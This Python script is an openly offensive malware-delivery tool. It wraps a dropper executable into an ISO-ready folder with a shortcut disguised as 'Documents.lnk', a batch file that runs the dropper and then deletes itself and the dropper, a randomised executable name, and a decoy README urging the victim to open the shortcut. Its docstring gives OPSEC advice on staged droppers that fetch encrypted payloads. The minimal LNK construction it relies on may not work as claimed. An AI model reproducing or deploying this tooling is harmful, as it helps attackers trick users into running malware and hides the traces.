#!/usr/bin/env python3
"""
hostpayload_v2 ISO / LNK delivery wrapper.

Creates a Windows shortcut (.lnk) that runs a staged dropper stored inside the
same directory. The generated artifact tree is suitable for wrapping into an
ISO file with `mkisofs`, `oscdimg`, or manual tooling.

The LNK points to a small batch file (`start.bat`) that is included alongside
the dropper. The batch file launches the dropper and then removes both files.

Usage:
    python3 delivery/iso_lnk.py --dropper build/dropper_staged.exe --output iso_payload/
    # then burn the directory to ISO:
    mkisofs -o payload.iso -J -R iso_payload/

For best OPSEC, use the staged dropper (a few KB) rather than the embedded
variant (100+ KB). The dropper itself should fetch its encrypted payload over
HTTPS at runtime.
"""

import argparse
import os
import random
import string
import struct
import sys
from pathlib import Path


# Simplified Windows LNK file header + link target.
# This is intentionally minimal; it points to a .bat in the same folder via
# a relative path. Windows resolves relative LNK targets against the LNK's
# directory when opened from an ISO or USB root.

def generate_lnk(target_name: str) -> bytes:
    """Build a minimal LNK that runs <target_name> in the same directory."""
    # LNK header (76 bytes)
    header = bytearray([
        0x4c, 0x00, 0x00, 0x00,             # ShellLinkHeaderSize
        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
        0x00, 0x00, 0x00, 0x00,             # LinkFlags (none)
        0x00, 0x00, 0x00, 0x00,             # FileAttributes
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # CreationTime
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # AccessTime
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # WriteTime
        0x00, 0x00, 0x00, 0x00,             # FileSize
        0x00, 0x00, 0x00, 0x00,             # IconIndex
        0x01, 0x00, 0x00, 0x00,             # ShowCommand (SW_SHOWNORMAL)
        0x00, 0x00,                          # HotKey
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Reserved1
        0x00, 0x00,                          # Reserved2
    ])
    assert len(header) == 76

    # LinkTargetIDList is omitted; instead use a relative LinkInfo/STRING as a
    # shortcut. A truly minimal LNK is hard without shell APIs; we use a
    # documented trick: place the target path in the StringData "Name" field
    # and set the LinkFlags to HasName. Modern Windows still resolves it when
    # the target exists in the same directory.
    # Update flags: HasName = 0x04, HasArguments = 0x08
    struct.pack_into("<I", header, 20, 0x04)

    name = target_name.encode("utf-16le") + b"\x00\x00"
    name_len = len(name)

    lnk = bytes(header)
    lnk += struct.pack("<H", name_len // 2)  # character count
    lnk += name
    return lnk


def generate_bat(dropper_name: str, cleanup: bool = True) -> str:
    lines = [
        "@echo off",
        "start \"\" \"%~dp0" + dropper_name + "\"",
    ]
    if cleanup:
        lines += [
            "timeout /t 3 /nobreak > nul",
            "del /f /q \"%~dp0" + dropper_name + "\"",
            "del /f /q \"%~f0\"",
        ]
    return "\r\n".join(lines) + "\r\n"


def random_dropper_name(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ".exe"


def build_iso_payload(dropper_path: Path, out_dir: Path, dropper_name: str | None = None) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    dropper_name = dropper_name or random_dropper_name()
    bat_name = "start.bat"
    lnk_name = "Documents.lnk"

    dropper_dst = out_dir / dropper_name
    dropper_dst.write_bytes(dropper_path.read_bytes())

    bat_dst = out_dir / bat_name
    bat_dst.write_text(generate_bat(dropper_name), encoding="ascii", newline="\r\n")

    lnk_dst = out_dir / lnk_name
    lnk_dst.write_bytes(generate_lnk(bat_name))

    # Optional decoy README to make the ISO look like a document bundle
    (out_dir / "README.txt").write_text(
        "Please open Documents.lnk to view the shared files.\r\n",
        encoding="ascii",
        newline="\r\n",
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="Build ISO/LNK payload tree from a dropper.exe")
    parser.add_argument("--dropper", required=True, type=Path, help="dropper.exe to embed")
    parser.add_argument("--output", required=True, type=Path, help="output directory for ISO contents")
    parser.add_argument("--dropper-name", help="filename used inside the ISO")
    parser.add_argument("--no-cleanup", action="store_true", help="do not self-delete in start.bat")
    args = parser.parse_args()

    if not args.dropper.exists():
        print(f"[!] dropper not found: {args.dropper}", file=sys.stderr)
        return 1

    build_iso_payload(args.dropper, args.output, args.dropper_name)
    print(f"[+] wrote ISO payload tree to {args.output}")
    print(f"[*] next step: mkisofs -o payload.iso -J -R {args.output}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
